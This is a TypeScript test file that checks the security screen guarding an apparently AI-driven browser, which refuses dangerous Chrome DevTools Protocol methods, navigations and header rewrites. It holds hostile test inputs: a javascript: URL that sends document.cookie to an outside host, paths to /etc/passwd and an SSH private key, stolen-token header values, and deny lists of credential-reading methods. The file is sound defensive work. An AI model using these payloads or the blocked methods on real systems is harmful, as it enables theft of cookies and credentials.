import { readdirSync, readFileSync } from 'node:fs'
import { join } from 'node:path'
import { describe, expect, it } from 'vitest'
import { cdpResourceType, cheapHeaders, RESOURCE_KINDS } from './browser-fetch-rules'
import {
  ALLOWED_METHODS,
  CDP_ALLOWED_METHODS,
  CDP_DENIED_METHODS,
  DENIED_METHODS,
  isDrivableUrl,
  SCREENED_FULFIL_HEADERS,
  SCREENED_RESOURCE_TYPES,
  screenCommand,
  type DriveState,
} from './browser-cdp'

/**
 * The security boundary, pinned.
 *
 * `DRIVABLE-BROWSER.md` §2.5 says three tests have to exist "or none of this is
 * true", and names them. They are here, adapted to the shape that shipped:
 * there is no listening socket and no target table, because the engine is this
 * repository's own driver rather than Playwright, so the questions "can the
 * renderer be enumerated" and "can a denied method be sent" are answered
 * structurally rather than over a wire.
 *
 * The structural ones are source assertions, deliberately. A test that pokes an
 * API can only show that the door in front of it is shut; these show that there
 * is no second door — which is the actual claim being made about this feature,
 * and the only kind of test that fails when somebody adds one.
 */

const SRC = join(__dirname)

function source(file: string): string {
  return readFileSync(join(SRC, file), 'utf8')
}

describe('the debugger channel is not reachable from anywhere else', () => {
  /*
   * §2.5 test 1, restated for a design with no target table.
   *
   * The design's version asserted that `Target.getTargets` returns exactly one
   * entry and that the renderer's id is not attachable. That test belongs to a
   * bridge that enumerates targets for Playwright. This driver never
   * enumerates: it holds one `WebContents` handed to it by the drive
   * registry, and the app's own renderer is not merely filtered out of a list —
   * there is no list. So what has to be pinned is the *absence* of the two
   * calls that would create one.
   */
  it('never asks Electron for every WebContents in the process', () => {
    for (const file of [
      'browser-cdp.ts',
      'browser-drive.ts',
      'browser-driver.ts',
      'browser-driven-electron.ts',
      'browser-profile-arm.ts',
    ]) {
      expect(source(file)).not.toContain('getAllWebContents')
      expect(source(file)).not.toContain('fromWebContents')
    }
  })

  it('sends debugger commands from exactly one place, and the driver screens before it dispatches', () => {
    // The one transport door now lives on the Electron `DrivenPage`, and there
    // is exactly one of it. A second `sendCommand` added anywhere in that file
    // would fail this count.
    const electron = source('browser-driven-electron.ts')
    const sends = electron.match(/debugger\.sendCommand\(/g) ?? []
    expect(sends).toHaveLength(1)
    // …and the driver hands a command to that door only through its own `send()`,
    // which screens it first. Matching the text rather than the behaviour is the
    // point: `page.send(` reached without the screen ahead of it would fail here.
    const driver = source('browser-driver.ts')
    const sendBody = driver.slice(driver.indexOf('private async send('), driver.indexOf('private async input('))
    expect(sendBody).toContain('screenCommand(')
    expect(sendBody).toContain('page.send(')
    expect(sendBody.indexOf('screenCommand(')).toBeLessThan(sendBody.indexOf('page.send('))
  })

  /*
   * The second holder of a debugger — `browser-profile-arm.ts`, which arms a
   * page from the person's own stored scraping settings — has its own door
   * and its own screen: a fixed allowlist of exactly the methods the network
   * engine issues, since no baton and no model is anywhere near that path.
   * Its own test file pins the door; what is pinned HERE is that no third
   * file anywhere in main sends debugger commands at all, so the set of
   * doors is closed by enumeration rather than by memory.
   */
  it('no third file in main sends debugger commands', () => {
    const files = readdirSync(SRC).filter(
      (name) => name.endsWith('.ts') && !name.endsWith('.test.ts'),
    )
    const senders = files.filter((name) => source(name).includes('debugger.sendCommand('))
    expect(senders.sort()).toEqual(['browser-driven-electron.ts', 'browser-profile-arm.ts'])
  })

  it('no third file in main attaches the debugger', () => {
    const files = readdirSync(SRC).filter(
      (name) => name.endsWith('.ts') && !name.endsWith('.test.ts'),
    )
    const attachers = files.filter((name) => source(name).includes('debugger.attach('))
    expect(attachers.sort()).toEqual(['browser-driven-electron.ts', 'browser-profile-arm.ts'])
  })

  it('runs page script from exactly one place, and that place checks the baton', () => {
    // The one isolated-world read now lives on the Electron `DrivenPage`, and
    // there is exactly one of it.
    const electron = source('browser-driven-electron.ts')
    const runs = electron.match(/executeJavaScriptInIsolatedWorld\(/g) ?? []
    expect(runs).toHaveLength(1)
    // …and the driver reaches that read only through its own `run<T>`, which
    // checks the baton first. Ends at `hold`, the next member, so the assertion
    // cannot be satisfied by a check belonging to some later method. The state
    // is read off the slot rather than the driver because a driven page is now
    // one of several, and the baton is a fact about a document.
    const driver = source('browser-driver.ts')
    const runBody = driver.slice(driver.indexOf('private async run<T>'), driver.indexOf('private async hold('))
    expect(runBody).toContain("slot.state !== 'agent'")
    expect(runBody).toContain('page.runInIsolatedWorld')
  })

  it('has no Electron import in the modules that make the decisions or drive', () => {
    // The whole reason `screenCommand` is a pure function over strings. A file
    // that imported Electron would be a file a test cannot drive, and these are
    // the files whose every branch has to be driven. `browser-driver.ts` joins
    // the list now that the `DrivenPage` seam put the Electron half behind it.
    expect(source('browser-cdp.ts')).not.toContain("from 'electron'")
    expect(source('browser-drive.ts')).not.toContain("from 'electron'")
    expect(source('browser-driver.ts')).not.toContain("from 'electron'")
  })
})

describe('the deny list', () => {
  const agent = { state: 'agent' as DriveState }

  /*
   * §2.5 test 2: every method in the table, asserted refused, by name, in a
   * list a reviewer can read against the table in the design document.
   */
  it.each(DENIED_METHODS)('refuses %s', (method) => {
    const verdict = screenCommand({ ...agent, method })
    expect(verdict.ok).toBe(false)
  })

  it('refuses the specific capabilities the design names', () => {
    // Spelled out rather than left to the loop above, so that deleting an entry
    // from the table breaks a test whose name says what was lost.
    const denied = [
      'Browser.close', // closing the browser is the instability he described
      'Target.closeTarget',
      'Network.getAllCookies', // the literal credentials
      'Storage.getCookies',
      'Page.setDownloadBehavior', // "drive a page" becomes "write files anywhere"
      'DOM.setFileInputFiles', // reads his disk into a website
      'Browser.grantPermissions', // re-grants camera and microphone
      'Page.bringToFront', // focus belongs to the person
      'Fetch.continueWithAuth', // composes a password and sends it to a site
      'Network.setExtraHTTPHeaders', // composes what his logged-in session sends
      'Runtime.evaluate', // the door a `browser.eval` tool would walk through
      'Page.navigate', // measured to bypass will-navigate entirely
    ]
    for (const method of denied) {
      expect(DENIED_METHODS).toContain(method)
      expect(screenCommand({ ...agent, method }).ok).toBe(false)
    }
  })

  it('does not overlap the allow list', () => {
    // If it ever did, the allow check would pass and the deny check would
    // refuse — which is the right outcome, but it would mean the two tables
    // disagree about what this app does, and one of them is wrong.
    const overlap = ALLOWED_METHODS.filter((method) => DENIED_METHODS.includes(method))
    expect(overlap).toEqual([])
  })

  it('refuses anything not on the allow list, including methods nobody has heard of', () => {
    for (const method of ['Console.enable', 'Accessibility.getFullAXTree', 'Nonsense.doThing', '']) {
      expect(screenCommand({ ...agent, method }).ok).toBe(false)
    }
  })

  /**
   * The arguments the two argument-checked methods need to pass.
   *
   * `Fetch.enable` and `Fetch.fulfillRequest` are the only entries on the
   * allow-list that are not allowed *on their own* — being on the list is
   * necessary and not sufficient, exactly as `Page.navigate` would be if it
   * were ever added. Naming them here rather than loosening the loop is what
   * keeps that visible: a third method growing an argument check will fail this
   * test until somebody writes down what it takes.
   */
  const ARGUMENTS: Record<string, Record<string, unknown>> = {
    'Fetch.enable': { patterns: [{ urlPattern: '*', resourceType: 'Image', requestStage: 'Request' }] },
    'Fetch.fulfillRequest': { requestId: 'r1', responseCode: 200 },
  }

  it('allows exactly the methods the driver needs, given arguments it would send', () => {
    for (const method of ALLOWED_METHODS) {
      const verdict = screenCommand({ ...agent, method, params: ARGUMENTS[method] ?? {} })
      expect(verdict.ok, `${method} was refused`).toBe(true)
    }
    expect(ALLOWED_METHODS).toContain('Input.dispatchMouseEvent')
    expect(ALLOWED_METHODS).toContain('Input.insertText')
    // The two halves of harvesting, which used to be denied outright.
    expect(ALLOWED_METHODS).toContain('Fetch.fulfillRequest')
    expect(ALLOWED_METHODS).toContain('Network.getResponseBody')
  })
})

describe('request interception, which is allowed and is argument-checked', () => {
  const agent = { state: 'agent' as DriveState }

  /*
   * `Fetch.enable` was on the deny-list until 2026-08-21, with the reason *"how
   * an agent ends up reading Authorization headers off somebody's logged-in
   * session"*. It moved, because answering an image request cheaply is the only
   * way to harvest a lazy-loading page without losing it — see the header of
   * `browser-cdp.ts` and the 16,498 floor plans behind it.
   *
   * The header argument is answered by construction rather than by refusal, and
   * the construction is asserted in `browser-network.test.ts`: nothing reads a
   * request's headers. What is asserted *here* is the part that is a rule — the
   * arguments that would turn "answer a request" into something else.
   */
  it('lets the driver arm interception for the kinds a rule can name', () => {
    const verdict = screenCommand({
      ...agent,
      method: 'Fetch.enable',
      params: {
        patterns: [
          { urlPattern: '*', resourceType: 'Image', requestStage: 'Request' },
          { urlPattern: '*', resourceType: 'Font', requestStage: 'Request' },
        ],
      },
    })
    expect(verdict.ok).toBe(true)
  })

  it('refuses interception with no patterns, because that pauses the document too', () => {
    for (const params of [{}, { patterns: [] }]) {
      const verdict = screenCommand({ ...agent, method: 'Fetch.enable', params })
      expect(verdict.ok).toBe(false)
      if (!verdict.ok) expect(verdict.reason).toContain('including the document')
    }
  })

  it('refuses a pattern that names the page’s own document', () => {
    const verdict = screenCommand({
      ...agent,
      method: 'Fetch.enable',
      params: { patterns: [{ urlPattern: '*', resourceType: 'Document', requestStage: 'Request' }] },
    })
    expect(verdict.ok).toBe(false)
  })

  it('refuses response-stage interception, which is a larger power than pausing a request', () => {
    const verdict = screenCommand({
      ...agent,
      method: 'Fetch.enable',
      params: { patterns: [{ urlPattern: '*', resourceType: 'XHR', requestStage: 'Response' }] },
    })
    expect(verdict.ok).toBe(false)
  })

  it('refuses handling authentication, because the call that answers one is denied', () => {
    const verdict = screenCommand({
      ...agent,
      method: 'Fetch.enable',
      params: {
        handleAuthRequests: true,
        patterns: [{ urlPattern: '*', resourceType: 'Image', requestStage: 'Request' }],
      },
    })
    expect(verdict.ok).toBe(false)
    // And the other half stays shut, so neither exists without the other.
    expect(DENIED_METHODS).toContain('Fetch.continueWithAuth')
  })

  /*
   * Letting a request through is the harmless-sounding half of interception,
   * and `url`, `method`, `postData` and `headers` all replace what the page
   * asked for. A `continueRequest` carrying headers is this app composing an
   * `Authorization` header on a request in his logged-in session — the exact
   * power the old deny-list entry was about, reached through the door nobody
   * was watching.
   */
  it('lets a paused request through, exactly as the driver sends it', () => {
    expect(screenCommand({ ...agent, method: 'Fetch.continueRequest', params: { requestId: 'r1' } }).ok).toBe(true)
  })

  it.each([
    ['url', 'https://elsewhere.example/'],
    ['method', 'POST'],
    ['postData', 'x=1'],
    ['headers', [{ name: 'authorization', value: 'Bearer stolen' }]],
  ])('refuses a continue that rewrites %s', (key, value) => {
    const verdict = screenCommand({
      ...agent,
      method: 'Fetch.continueRequest',
      params: { requestId: 'r1', [key]: value },
    })
    expect(verdict.ok).toBe(false)
    if (!verdict.ok) expect(verdict.reason).toContain('but not rewritten')
  })

  it('refuses a continue that asks to intercept the response as well', () => {
    const verdict = screenCommand({
      ...agent,
      method: 'Fetch.continueRequest',
      params: { requestId: 'r1', interceptResponse: true },
    })
    expect(verdict.ok).toBe(false)
  })

  /*
   * The sharpest of the new checks.
   *
   * `Fetch.fulfillRequest` writes a response **into his session**. A
   * `set-cookie` on one is this app minting a cookie in a jar he is signed into
   * — invisibly, from a tool call — and a `location` is it redirecting him. An
   * allow-list of header names is what keeps "answer an image cheaply" unable
   * to be anything else.
   */
  it('lets a cheap answer carry the headers a placeholder needs', () => {
    const verdict = screenCommand({
      ...agent,
      method: 'Fetch.fulfillRequest',
      params: { requestId: 'r1', responseCode: 200, responseHeaders: cheapHeaders('image/png', 71) },
    })
    expect(verdict.ok).toBe(true)
  })

  it.each([
    ['set-cookie', 'session=stolen'],
    ['Set-Cookie', 'session=stolen'],
    ['location', 'https://elsewhere.example/'],
    ['content-security-policy', "default-src 'none'"],
  ])('refuses a cheap answer carrying %s', (name, value) => {
    const verdict = screenCommand({
      ...agent,
      method: 'Fetch.fulfillRequest',
      params: { requestId: 'r1', responseCode: 200, responseHeaders: [{ name, value }] },
    })
    expect(verdict.ok).toBe(false)
  })

  it('refuses a pre-encoded header block, which would walk past the name check', () => {
    const verdict = screenCommand({
      ...agent,
      method: 'Fetch.fulfillRequest',
      params: {
        requestId: 'r1',
        responseCode: 200,
        binaryResponseHeaders: Buffer.from('set-cookie: a=b').toString('base64'),
      },
    })
    expect(verdict.ok).toBe(false)
  })

  it.each([301, 302, 401, 404, 500])('refuses answering cheaply with %i', (responseCode) => {
    const verdict = screenCommand({
      ...agent,
      method: 'Fetch.fulfillRequest',
      params: { requestId: 'r1', responseCode },
    })
    expect(verdict.ok).toBe(false)
  })

  /*
   * The gate spells its own vocabulary rather than importing it from the module
   * it polices — a security check that reads its table out of the policed module
   * can be widened by editing that module. This is what keeps the two
   * statements one truth.
   */
  it('screens exactly the resource kinds the rules module can produce', () => {
    expect([...SCREENED_RESOURCE_TYPES].sort()).toEqual(
      RESOURCE_KINDS.map(cdpResourceType).sort(),
    )
    expect(SCREENED_RESOURCE_TYPES).not.toContain('Document')
  })

  it('screens every header a cheap answer actually sends', () => {
    for (const header of cheapHeaders('image/png', 0)) {
      expect(SCREENED_FULFIL_HEADERS).toContain(header.name)
    }
    expect(SCREENED_FULFIL_HEADERS).not.toContain('set-cookie')
  })

  it('still refuses the whole capture path while the person has the page', () => {
    // Which is why `PageNetwork.suspend` disarms *before* the baton moves: a
    // paused request that cannot be answered is a page that never loads, and
    // handing him one of those to type a password into would be the worst
    // version of this feature.
    for (const method of ['Fetch.enable', 'Fetch.fulfillRequest', 'Network.getResponseBody']) {
      expect(screenCommand({ state: 'human', method }).ok).toBe(false)
    }
  })
})

describe('navigation is re-checked at the channel', () => {
  /*
   * §2.5 test 3, and the one with the sharpest edge.
   *
   * Measured on Electron 41.10.5 / Chromium 146: a CDP `Page.navigate` to
   * `file:///etc/passwd` **succeeded** on a `WebContentsView` that had a
   * `will-navigate` handler installed calling `preventDefault()` on everything.
   * The handler did not run. `webContents.getURL()` afterwards was
   * `file:///etc/passwd`.
   *
   * So the guard in `browser-tab.ts` covers renderer-initiated navigation only,
   * and for a browser-initiated one this check is the whole of the protection.
   */
  it.each([
    'file:///etc/passwd',
    'file:///Users/apple/.ssh/id_rsa',
    'devtools://devtools/bundled/inspector.html',
    'chrome://settings',
    'javascript:fetch("https://x/"+document.cookie)',
    'data:text/html,<script>1</script>',
    'about:blank',
  ])('refuses Page.navigate to %s', (url) => {
    expect(screenCommand({ state: 'agent', method: 'Page.navigate', params: { url } }).ok).toBe(false)
  })

  it('refuses Page.navigate even to an address that would otherwise be fine', () => {
    // Because it is not on the allow list at all. The driver navigates through
    // `loadURL`, which does pass through `normalizeUrl`. If somebody ever adds
    // `Page.navigate` to the allow list, the URL check below is what is left.
    expect(screenCommand({ state: 'agent', method: 'Page.navigate', params: { url: 'https://example.com' } }).ok).toBe(false)
  })

  it('the URL rule itself refuses every scheme but http and https', () => {
    expect(isDrivableUrl('https://example.com/')).toBe(true)
    expect(isDrivableUrl('http://localhost:3000/')).toBe(true)
    expect(isDrivableUrl('file:///etc/passwd')).toBe(false)
    expect(isDrivableUrl('javascript:alert(1)')).toBe(false)
    expect(isDrivableUrl('devtools://x')).toBe(false)
    expect(isDrivableUrl('about:blank')).toBe(false)
    expect(isDrivableUrl('')).toBe(false)
    expect(isDrivableUrl(null)).toBe(false)
  })
})

describe('the baton is checked before the method', () => {
  it('refuses everything while the person has the page, including reads', () => {
    // The whole enforcement story for the password. A screenshot taken while he
    // is typing is the leak, so `human` shuts the channel rather than filtering
    // it — you cannot redact what was never produced.
    for (const method of ALLOWED_METHODS) {
      const verdict = screenCommand({ state: 'human', method })
      expect(verdict.ok).toBe(false)
      if (!verdict.ok) expect(verdict.reason).toContain('the person is using this page')
    }
  })

  it('refuses everything when nothing is being driven', () => {
    for (const method of ALLOWED_METHODS) {
      expect(screenCommand({ state: 'idle', method }).ok).toBe(false)
    }
  })

  it('answers the baton before it answers the method, so the reason names the person', () => {
    // A denied method during a handover must say "the person has it", not
    // "that method is refused" — the model's next move differs completely.
    const verdict = screenCommand({ state: 'human', method: 'Browser.close' })
    expect(verdict.ok).toBe(false)
    if (!verdict.ok) expect(verdict.reason).toContain('the person is using this page')
  })
})

/*
 * The second transport.
 *
 * Everything above screens the desktop channel — one `WebContents`, a tiny
 * protocol, reads and screenshots done through Electron APIs rather than CDP.
 * Below is the headless server, where the `--remote-debugging-pipe` is the only
 * door and so the reads, the screenshot, the navigation and the target
 * lifecycle all have to travel the protocol. `transport: 'cdp'` selects the
 * second pair of tables; the default is `electron`, which is why every test
 * above still describes the desktop unchanged.
 */
describe('the CDP tables screen the pipe transport', () => {
  const DOWNLOADS = '/home/deck/.config/terminaldeck/downloads'

  /**
   * The arguments the argument-checked CDP methods need to pass.
   *
   * Being on the CDP allow-list is necessary and, for these, not sufficient —
   * each carries a capability in its arguments and is refused without the right
   * ones. Naming them here rather than loosening the loop keeps that visible.
   */
  const CDP_ARGUMENTS: Record<string, Record<string, unknown>> = {
    'Fetch.enable': { patterns: [{ urlPattern: '*', resourceType: 'Image', requestStage: 'Request' }] },
    'Fetch.fulfillRequest': { requestId: 'r1', responseCode: 200 },
    'Page.navigate': { url: 'https://example.com/' },
    'Runtime.evaluate': { contextId: 7 },
    'Runtime.callFunctionOn': { executionContextId: 7 },
    'Browser.setDownloadBehavior': { behavior: 'allowAndName', downloadPath: DOWNLOADS },
    'Target.createTarget': { url: 'about:blank' },
    'Network.getCookies': { urls: ['https://example.com/'] },
  }

  it('allows exactly the methods the server driver needs, given arguments it would send', () => {
    for (const method of CDP_ALLOWED_METHODS) {
      const verdict = screenCommand({
        transport: 'cdp',
        state: 'agent',
        method,
        params: CDP_ARGUMENTS[method] ?? {},
        downloadsDir: DOWNLOADS,
      })
      expect(verdict.ok, `${method} was refused`).toBe(true)
    }
    // The reads the desktop does through Electron APIs, which the server must do
    // over the wire, and the target lifecycle the DriveHost now owns.
    expect(CDP_ALLOWED_METHODS).toContain('Runtime.evaluate')
    expect(CDP_ALLOWED_METHODS).toContain('Page.captureScreenshot')
    expect(CDP_ALLOWED_METHODS).toContain('Page.navigate')
    expect(CDP_ALLOWED_METHODS).toContain('Target.createTarget')
    // Everything the desktop channel sends is still allowed on the pipe.
    for (const method of ALLOWED_METHODS) expect(CDP_ALLOWED_METHODS).toContain(method)
  })

  it.each(CDP_DENIED_METHODS)('refuses %s on the pipe transport', (method) => {
    expect(screenCommand({ transport: 'cdp', state: 'agent', method }).ok).toBe(false)
  })

  it('still refuses the desktop dangers a server has no more right to', () => {
    // Spelled out so deleting one from the CDP deny-list breaks a named test.
    const denied = [
      'Browser.close', // the instability he described, on either transport
      'Network.getAllCookies', // the whole jar — the literal credentials
      'Storage.getCookies', // the whole context jar
      'Page.setDownloadBehavior', // the deprecated caller-named download door
      'DOM.setFileInputFiles', // reads his disk into a website
      'Browser.grantPermissions', // re-grants camera and microphone
      'Network.setExtraHTTPHeaders', // composes what his session sends
      'Fetch.continueWithAuth', // composes a password and sends it to a site
      'Page.printToPDF', // writes a file
      'Runtime.compileScript', // arbitrary script off the model's path
      'Page.navigateToHistoryEntry', // no URL to screen; nothing drives it
    ]
    for (const method of denied) {
      expect(CDP_DENIED_METHODS).toContain(method)
      expect(screenCommand({ transport: 'cdp', state: 'agent', method }).ok).toBe(false)
    }
  })

  it('keeps the CDP allow and deny tables disjoint', () => {
    const overlap = CDP_ALLOWED_METHODS.filter((method) => CDP_DENIED_METHODS.includes(method))
    expect(overlap).toEqual([])
  })

  it('refuses a method on neither CDP table, including ones nobody has heard of', () => {
    for (const method of ['Console.enable', 'Accessibility.getFullAXTree', 'Nonsense.doThing', '']) {
      expect(screenCommand({ transport: 'cdp', state: 'agent', method }).ok).toBe(false)
    }
  })

  it('does not leak the server-only powers back onto the desktop', () => {
    // The whole point of the axis: what the pipe may send, the WebContents may
    // not. Both the default (electron) and the explicit spelling refuse them.
    for (const method of [
      'Runtime.evaluate',
      'Page.captureScreenshot',
      'Page.navigate',
      'Target.createTarget',
      'Browser.setDownloadBehavior',
      'Network.getCookies',
    ]) {
      expect(screenCommand({ state: 'agent', method, params: {} }).ok).toBe(false)
      expect(screenCommand({ transport: 'electron', state: 'agent', method, params: {} }).ok).toBe(false)
    }
  })

  it('shuts the pipe entirely while the person has the page, reads included', () => {
    for (const method of CDP_ALLOWED_METHODS) {
      const verdict = screenCommand({ transport: 'cdp', state: 'human', method })
      expect(verdict.ok).toBe(false)
      if (!verdict.ok) expect(verdict.reason).toContain('the person is using this page')
    }
    // The screenshot read specifically: a capture taken while he types a
    // password is the leak, so `human` refuses it on the pipe as on the desktop.
    expect(screenCommand({ transport: 'cdp', state: 'human', method: 'Page.captureScreenshot' }).ok).toBe(false)
  })
})

describe('navigation is the only door on the server, and it is screened there', () => {
  /*
   * On the desktop `Page.navigate` is refused by the allow-list before the URL
   * check is ever reached — the driver navigates through `loadURL`. On the pipe
   * there is no `loadURL`, so `Page.navigate` IS the door, and the same
   * `isNavigationAllowed` guard that was dead code on the desktop becomes the
   * whole of the `file://` protection here — a browser-initiated navigate walks
   * past `will-navigate`, measured, so this is the only guard there is.
   */
  it.each([
    'file:///etc/passwd',
    'file:///Users/apple/.ssh/id_rsa',
    'devtools://devtools/bundled/inspector.html',
    'chrome://settings',
    'javascript:fetch("https://x/"+document.cookie)',
    'data:text/html,<script>1</script>',
  ])('refuses Page.navigate to %s over the pipe', (url) => {
    expect(screenCommand({ transport: 'cdp', state: 'agent', method: 'Page.navigate', params: { url } }).ok).toBe(false)
  })

  it('opens an ordinary http or https address over the pipe', () => {
    expect(screenCommand({ transport: 'cdp', state: 'agent', method: 'Page.navigate', params: { url: 'https://example.com/' } }).ok).toBe(true)
    expect(screenCommand({ transport: 'cdp', state: 'agent', method: 'Page.navigate', params: { url: 'http://localhost:3000/' } }).ok).toBe(true)
  })

  it('lets a target be reset to about:blank, which is what an empty view holds', () => {
    expect(screenCommand({ transport: 'cdp', state: 'agent', method: 'Page.navigate', params: { url: 'about:blank' } }).ok).toBe(true)
  })
})

describe('evaluation on the server never touches the main world', () => {
  const cdp = { transport: 'cdp' as const, state: 'agent' as DriveState }

  it('refuses Runtime.evaluate with no context, because that is the main world', () => {
    const verdict = screenCommand({ ...cdp, method: 'Runtime.evaluate', params: { expression: '1+1' } })
    expect(verdict.ok).toBe(false)
    if (!verdict.ok) expect(verdict.reason).toContain('main world')
  })

  it('allows Runtime.evaluate inside a named isolated context', () => {
    expect(screenCommand({ ...cdp, method: 'Runtime.evaluate', params: { expression: '1+1', contextId: 7 } }).ok).toBe(true)
    expect(screenCommand({ ...cdp, method: 'Runtime.evaluate', params: { expression: '1+1', uniqueContextId: 'ctx-abc' } }).ok).toBe(true)
  })

  it('is not fooled by an objectId on an evaluate, which Chromium would ignore into the main world', () => {
    // Runtime.evaluate does not accept objectId; passing it names no context, so
    // the call would run in the main world and must be refused.
    expect(screenCommand({ ...cdp, method: 'Runtime.evaluate', params: { expression: '1+1', objectId: 'obj-1' } }).ok).toBe(false)
  })

  it('allows Runtime.callFunctionOn on an object or an execution context', () => {
    expect(screenCommand({ ...cdp, method: 'Runtime.callFunctionOn', params: { functionDeclaration: 'function(){}', objectId: 'obj-1' } }).ok).toBe(true)
    expect(screenCommand({ ...cdp, method: 'Runtime.callFunctionOn', params: { functionDeclaration: 'function(){}', executionContextId: 7 } }).ok).toBe(true)
    expect(screenCommand({ ...cdp, method: 'Runtime.callFunctionOn', params: { functionDeclaration: 'function(){}', uniqueContextId: 'ctx-abc' } }).ok).toBe(true)
  })

  it('refuses Runtime.callFunctionOn that names no context at all', () => {
    expect(screenCommand({ ...cdp, method: 'Runtime.callFunctionOn', params: { functionDeclaration: 'function(){}' } }).ok).toBe(false)
  })
})

describe('downloads on the server are pinned to the host directory', () => {
  const DOWNLOADS = '/home/deck/.config/terminaldeck/downloads'
  const cdp = { transport: 'cdp' as const, state: 'agent' as DriveState }

  it('allows the host download behaviour written to the host directory', () => {
    const verdict = screenCommand({
      ...cdp,
      method: 'Browser.setDownloadBehavior',
      params: { behavior: 'allowAndName', downloadPath: DOWNLOADS },
      downloadsDir: DOWNLOADS,
    })
    expect(verdict.ok).toBe(true)
  })

  it('refuses a download path the caller chose rather than the host', () => {
    const verdict = screenCommand({
      ...cdp,
      method: 'Browser.setDownloadBehavior',
      params: { behavior: 'allowAndName', downloadPath: '/etc' },
      downloadsDir: DOWNLOADS,
    })
    expect(verdict.ok).toBe(false)
    if (!verdict.ok) expect(verdict.reason).toContain('downloads directory')
  })

  it.each(['deny', 'default', 'allow'])('refuses the %s behaviour, since only allowAndName keeps the file', (behavior) => {
    const verdict = screenCommand({
      ...cdp,
      method: 'Browser.setDownloadBehavior',
      params: { behavior, downloadPath: DOWNLOADS },
      downloadsDir: DOWNLOADS,
    })
    expect(verdict.ok).toBe(false)
  })

  it('refuses to pin a download when the host has no configured directory', () => {
    const verdict = screenCommand({
      ...cdp,
      method: 'Browser.setDownloadBehavior',
      params: { behavior: 'allowAndName', downloadPath: DOWNLOADS },
    })
    expect(verdict.ok).toBe(false)
  })
})

describe('opening a target is screened like a navigation', () => {
  const cdp = { transport: 'cdp' as const, state: 'agent' as DriveState }

  it('opens a target at about:blank or an http(s) address', () => {
    expect(screenCommand({ ...cdp, method: 'Target.createTarget', params: { url: 'about:blank' } }).ok).toBe(true)
    expect(screenCommand({ ...cdp, method: 'Target.createTarget', params: { url: 'https://example.com/' } }).ok).toBe(true)
  })

  it.each([
    'file:///etc/passwd',
    'chrome://settings',
    'javascript:alert(1)',
    'data:text/html,<script>1</script>',
  ])('refuses a target opened at %s', (url) => {
    expect(screenCommand({ ...cdp, method: 'Target.createTarget', params: { url } }).ok).toBe(false)
  })

  it('refuses a target with no opening address at all', () => {
    expect(screenCommand({ ...cdp, method: 'Target.createTarget', params: {} }).ok).toBe(false)
  })
})

describe('the one cookie relaxation is scoped to a single URL', () => {
  const cdp = { transport: 'cdp' as const, state: 'agent' as DriveState }

  it('reads the cookies for exactly one http(s) URL', () => {
    expect(screenCommand({ ...cdp, method: 'Network.getCookies', params: { urls: ['https://example.com/'] } }).ok).toBe(true)
  })

  it.each([
    [{}],
    [{ urls: [] }],
    [{ urls: ['https://a.example/', 'https://b.example/'] }],
    [{ urls: ['file:///etc/passwd'] }],
    [{ urls: ['not a url'] }],
  ])('refuses a cookie read that is not one http(s) URL: %o', (params) => {
    expect(screenCommand({ ...cdp, method: 'Network.getCookies', params }).ok).toBe(false)
  })

  it('keeps the whole-jar and whole-context reads denied', () => {
    expect(screenCommand({ ...cdp, method: 'Network.getAllCookies' }).ok).toBe(false)
    expect(screenCommand({ ...cdp, method: 'Storage.getCookies' }).ok).toBe(false)
    expect(CDP_DENIED_METHODS).toContain('Network.getAllCookies')
    expect(CDP_DENIED_METHODS).toContain('Storage.getCookies')
  })
})
